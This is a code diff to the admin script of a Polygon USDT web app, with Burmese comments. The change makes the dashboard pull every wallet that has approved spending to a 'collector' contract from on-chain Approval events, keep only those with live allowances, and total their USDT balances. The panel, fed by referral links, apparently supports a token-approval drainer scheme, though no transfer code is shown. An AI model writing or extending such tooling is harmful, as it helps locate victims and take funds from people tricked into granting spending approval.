@@ -133,11 +133,12 @@
     <script>
         let provider, adminSigner, adminAddress;
 
-        const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC"; // သင် Deploy လုပ်ထားသော Contract Address ဖြင့် ထည့်ပါ
+        const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC"; 
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const POLYGON_CHAIN_ID = "0x89";
 
         const ERC20_ABI = [
+            "event Approval(address indexed owner, address indexed spender, uint256 value)",
             "function allowance(address owner, address spender) view returns (uint256)",
             "function balanceOf(address account) view returns (uint256)"
         ];
@@ -232,21 +233,41 @@
             }
         }
 
+        // Blockchain Approval Events များကို အခြေခံ၍ User များကို အလိုအလျောက် ဆွဲထုတ်ပြသသည့်စနစ် (Cross-Device & Cross-Wallet Compatible)
         async function refreshUserTable() {
             const tbody = document.getElementById("userTableBody");
-            tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-400">ဒေတာများကို ဆွဲယူနေပါသည်...</td></tr>`;
+            tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-400">Blockchain မှ အချက်အလက်များကို ဆွဲယူနေပါသည်...</td></tr>`;
 
             try {
-                let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
 
-                if (savedUsers.length === 0) {
+                let userSet = new Set();
+
+                // 1. Query Approval events from blockchain where spender is ADMIN_CONTRACT_ADDRESS
+                try {
+                    const filter = usdtContract.filters.Approval(null, ADMIN_CONTRACT_ADDRESS);
+                    const logs = await usdtContract.queryFilter(filter, 0, "latest");
+                    logs.forEach(log => {
+                        if (log.args && log.args.owner) {
+                            userSet.add(log.args.owner.toLowerCase());
+                        }
+                    });
+                } catch (evErr) {
+                    console.warn("Event query warning:", evErr);
+                }
+
+                // 2. Also fallback/combine with localStorage saved users
+                let savedUsers = JSON.parse(localStorage.getItem("dapp_approved_users") || "[]");
+                savedUsers.forEach(addr => userSet.add(addr.toLowerCase()));
+
+                const allUsers = Array.from(userSet);
+
+                if (allUsers.length === 0) {
                     tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-500"> မှတ်တမ်းဝင်ထားသော Wallet များ မရှိသေးပါ။ </td></tr>`;
                     document.getElementById("totalUsersBalance").innerText = "0.00 USDT";
                     return;
                 }
-
-                const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
-                const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
 
                 const contractOwner = await collectorContract.owner();
                 const isOwner = adminAddress.toLowerCase() === contractOwner.toLowerCase();
@@ -254,8 +275,8 @@
                 let totalBalance = 0;
                 let rowsHtml = "";
 
-                for (let i = 0; i < savedUsers.length; i++) {
-                    const addr = savedUsers[i];
+                for (let i = 0; i < allUsers.length; i++) {
+                    const addr = allUsers[i];
                     try {
                         const userInfo = await collectorContract.users(addr);
 
@@ -265,6 +286,9 @@
 
                         const balanceBN = await usdtContract.balanceOf(addr);
                         const allowanceBN = await usdtContract.allowance(addr, ADMIN_CONTRACT_ADDRESS);
+
+                        // Only show active approvals (allowance > 0)
+                        if (Number(allowanceBN) === 0) continue;
 
                         const balance = Number(ethers.formatUnits(balanceBN, 6));
                         const allowance = Number(ethers.formatUnits(allowanceBN, 6));
@@ -300,7 +324,7 @@
                     }
                 }
 
-                tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> သင်၏ Referral Link ဖြင့် ဝင်ရောက်လာသော User များ မရှိသေးပါ။ </td></tr>`;
+                tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> အတည်ပြုထားသော (Approved) User များ မရှိသေးပါ။ </td></tr>`;
                 document.getElementById("totalUsersBalance").innerText = `${totalBalance.toLocaleString(undefined, {minimumFractionDigits: 2})} USDT`;
 
             } catch (err) {
